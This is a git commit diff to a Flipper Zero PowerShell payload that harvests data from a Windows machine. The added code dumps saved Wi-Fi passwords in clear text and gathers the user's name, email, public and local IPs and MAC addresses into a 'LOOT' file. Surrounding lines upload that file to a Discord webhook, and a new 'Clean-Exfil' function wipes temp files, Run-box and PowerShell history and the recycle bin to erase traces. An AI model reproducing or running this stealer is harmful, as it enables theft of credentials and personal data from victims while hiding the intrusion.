f57ea2477ac02b2be461fad9d9648fdf09b9470d
Tu <tu.t.nguyen93@gmail.com>
2023-11-10 16:40:53 -0500

    add test var

--- flipper-zero/test.ps1
+++ flipper-zero/test.ps1
@@ -2,9 +2,93 @@ $FileName = "$env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
+$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+function Get-fullName {
+
+    try {
+    $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
+    }
+ 
+ # If no name is detected function will return $env:UserName 
+
+    # Write Error is just for troubleshooting 
+    catch {Write-Error "No name was detected" 
+    return $env:UserName
+    -ErrorAction SilentlyContinue
+    }
+
+    return $fullName 
+
+}
+
+$fullName = Get-fullName
+
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+function Get-email {
+    
+    try {
+
+    $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
+    return $email
+    }
+
+# If no email is detected function will return backup message for sapi speak
+
+    # Write Error is just for troubleshooting
+    catch {Write-Error "An email was not found" 
+    return "No Email Detected"
+    -ErrorAction SilentlyContinue
+    }        
+}
+
+$email = Get-email
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+
+try{$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content}
+catch{$computerPubIP="Error getting Public IP"}
+
+
+
+$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String
+
+$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name, MacAddress, Status | Out-String
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
 
 $output = @"
+
+Full Name: $fullName
+
+Email: $email
+
+------------------------------------------------------------------------------------------------------------------------------
+Public IP: 
+$computerPubIP
+
+Local IPs:
+$localIP
+
+MAC:
+$MAC
+
+------------------------------------------------------------------------------------------------------------------------------
+Wifi Profile:
+$wifiProfiles
+
+------------------------------------------------------------------------------------------------------------------------------
 test
+$test
+
+------------------------------------------------------------------------------------------------------------------------------
+
 "@
 
 $output > $FileName
@@ -35,3 +119,26 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$FileName"}
+
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+function Clean-Exfil { 
+
+    # empty temp folder
+    rm $env:tmp\* -r -Force -ErrorAction SilentlyContinue
+    
+    # delete run box history
+    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
+    
+    # Delete powershell history
+    Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+    
+    # Empty recycle bin
+    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+    
+    }
+
+if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
+
+#------------------------------------------------------------------------------------------------------------------------------------
